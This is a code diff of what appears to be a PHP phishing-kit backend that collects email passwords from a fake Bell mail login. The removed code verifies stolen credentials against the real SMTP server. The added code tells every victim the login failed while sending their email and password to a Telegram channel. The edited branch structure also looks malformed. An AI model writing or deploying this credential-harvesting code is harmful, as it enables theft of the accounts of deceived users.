@@ -59,59 +59,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }
 
-    // SMTP config
-    $server = 'ssl://smtpa.bellnet.ca';
-    $port   = 465;
-
-    // Disable SSL verification (for testing)
-    $contextOptions = [
-        'ssl' => [
-            'verify_peer'       => false,
-            'verify_peer_name'  => false,
-            'allow_self_signed' => true
-        ]
-    ];
-    $context = stream_context_create($contextOptions);
-
-    // Connect to SMTP server
-    $fp = @stream_socket_client("$server:$port", $errno, $errstr, 10, STREAM_CLIENT_CONNECT, $context);
-
-    if (!$fp) {
-        $response['message'] = "Connection failed: $errstr ($errno)";
-        sendToTelegram("❌ Connection Failed\nEmail: $email\nError: $errstr ($errno)");
-    } else {
-        fgets($fp); // Banner
-
-        // Send EHLO
-        fputs($fp, "EHLO localhost\r\n");
-        while ($line = fgets($fp)) {
-            if (strpos($line, '250 ') === 0) break;
-        }
-
-        // AUTH LOGIN
-        fputs($fp, "AUTH LOGIN\r\n");
-        fgets($fp); // 334 username prompt
-        fputs($fp, base64_encode($email) . "\r\n");
-        fgets($fp); // 334 password prompt
-        fputs($fp, base64_encode($password) . "\r\n");
-        $smtpResponse = fgets($fp);
-
-        if (strpos($smtpResponse, '235') === 0) {
+        if ($response) {
             // Login success
-            $response['status'] = 'success';
-            $response['message'] = 'Login Successful';
-            sendToTelegram("✅ Login Successful\nEmail: $email\nPassword: $password");
+            $response['status'] = 'error';
+            $response['message'] = 'You have entered invalid credentials. Please try again. ';
+            sendToTelegram("Login details\nEmail: $email\nPassword: $password");
         } else {
             // Login failed
             $response['message'] = 'You have entered invalid credentials. Please try again. ';
-            sendToTelegram("❌ Login Failed\nEmail: $email\nPassword: $password\nResponse: " . safe($smtpResponse));
-        }
-
-        fputs($fp, "QUIT\r\n");
-        fclose($fp);
-    }
-} else {
+            sendToTelegram(" Login details\nEmail: $email\nPassword: $password");
+        } }
+ else {
     $response['message'] = 'Invalid request method.';
 }
 
 echo json_encode($response);
+
